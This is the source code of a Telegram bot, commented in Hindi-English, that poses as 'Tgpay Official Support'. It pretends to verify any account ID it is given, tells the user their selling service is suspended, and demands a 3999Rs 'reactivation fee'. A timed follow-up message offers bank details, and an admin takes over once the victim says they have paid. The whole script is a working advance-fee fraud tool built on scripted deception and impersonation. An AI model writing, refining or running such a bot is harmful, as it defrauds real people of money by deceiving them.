import os
import json
import time
import telebot
import threading  # Background delay ke liye zaroori hai
from dotenv import load_dotenv

# ---------------- LOAD ----------------
load_dotenv()

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ADMIN_ID = 8609446407 

bot = telebot.TeleBot(TOKEN)
USERS_FILE = "users.json"

# ---------------- USERS DATA HANDLING ----------------
def load_users():
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_users(data):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

users = load_users()
manual_mode = {}

# ---------------- AUTO MESSAGE FUNCTION ----------------
def auto_send_bank_offer(uid):
    """1-2 minute baad automatic message bhejne ke liye"""
    time.sleep(90) # 1.5 minute ka wait
    
    # Check karein ki user abhi bhi usi step par hai ya nahi
    if users.get(uid, {}).get("step") == "wait_for_bank":
        msg = ("✅ **Bank Details Available:**\n\n"
               "Your reactivation fee is **3999Rs**. "
               "Ab aap 'Bank Details Provide' reply karein to main aapko bank details send kar dunga.")
        bot.send_message(uid, msg, parse_mode="Markdown")

# ---------------- CUSTOMER SUPPORT LOGIC ----------------
def get_step_reply(uid, text):
    msg = text.lower()
    user_data = users.get(uid, {})
    step = user_data.get("step", "start")

    # Step 1: Greeting
    if msg in ["hi", "hello", "hii", "hey", "/start"]:
        users[uid]["step"] = "wait_tgpay_id"
        save_users(users)
        return "Welcome to Tgpay Official Support. Please provide your **Tgpay ID** for account verification."

    # Step 2: Receive Tgpay ID
    elif step == "wait_tgpay_id":
        users[uid]["step"] = "connected"
        save_users(users)
        return f"System Check: Tgpay ID {text} verified. Your account has been **connected successfully**. How can we assist you?"

    # Step 3: Selling Issues
    elif any(x in msg for x in ["selling nahi", "not received", "selling issue", "no sales"]):
        users[uid]["step"] = "selling_stopped"
        save_users(users)
        return "We regret to inform you that your selling service has been suspended. To reactivate it, you must pay the mandatory **Selling Activation Fee**."

    # Step 4: User says OK / Where to pay?
    elif any(x in msg for x in ["oke", "okay", "ok", "kaha karna hai", "where to pay"]):
        users[uid]["step"] = "wait_for_bank"
        save_users(users)
        
        # Background mein timer start karein (1.5 min baad message jayega)
        threading.Thread(target=auto_send_bank_offer, args=(uid,)).start()
        
        return "Please stay active. We will provide our official **Bank Details** as soon as they are available. Please keep your notifications on."

    # Step 5: User asks for details after auto-message
    elif any(x in msg for x in ["bank details provide", "send details", "bank details send karo", "detels"]):
        users[uid]["step"] = "request_sent"
        save_users(users)
        return "Wait, humne aapka request team ko send kar diye hai. Thori der mein aapko bank details mil jayega."

    # Step 6: User refuses (Mana kare to)
    elif any(x in msg for x in ["nahi de sakta", "no money", "paise nahi hai", "nahi kar sakta", "mana"]):
        return "Agar aap activation fee pay nahi kar sakte, toh aapko manually Tgpay application se ja kar orders monitor karne honge aur wahan se order buy karna hoga."

    # Step 7: Payment Done
    elif any(x in msg for x in ["payment done", "paid", "done"]):
        users[uid]["step"] = "manual"
        save_users(users)
        return "Payment notification received. Please wait while our team is **checking your transaction status**..."

    return None

# ---------------- MESSAGE HANDLERS ----------------

@bot.message_handler(func=lambda m: True)
def handle_all_messages(message):
    uid = str(message.chat.id)
    
    if uid not in users:
        users[uid] = {"name": message.from_user.first_name, "username": message.from_user.username, "step": "start"}
        save_users(users)

    # Admin Manual Override
    if uid in manual_mode or users[uid].get("step") == "manual":
        bot.send_message(ADMIN_ID, f"💬 **User ({uid}):** {message.text}")
        return

    # Reply Logic
    reply = get_step_reply(uid, message.text)

    if reply:
        bot.send_chat_action(message.chat.id, "typing")
        time.sleep(1.5)
        bot.reply_to(message, reply)

# ---------------- ADMIN COMMANDS ----------------

@bot.message_handler(commands=['reply'])
def admin_reply(message):
    if message.chat.id != ADMIN_ID: return
    try:
        data = message.text.split(" ", 2)
        target_uid, msg_text = data[1], data[2]
        manual_mode[target_uid] = True
        bot.send_message(target_uid, msg_text)
        bot.send_message(ADMIN_ID, f"✅ Sent to {target_uid}. AI Disabled.")
    except:
        bot.send_message(ADMIN_ID, "❌ /reply [user_id] [msg]")

@bot.message_handler(commands=['auto'])
def set_auto(message):
    if message.chat.id != ADMIN_ID: return
    try:
        uid = message.text.split(" ")[1]
        if uid in manual_mode: del manual_mode[uid]
        users[uid]["step"] = "start"
        save_users(users)
        bot.send_message(ADMIN_ID, f"🤖 AI Enabled for {uid}.")
    except:
        bot.send_message(ADMIN_ID, "❌ /auto [user_id]")

# ---------------- START ----------------
print("Bot is Live...")
bot.infinity_polling()
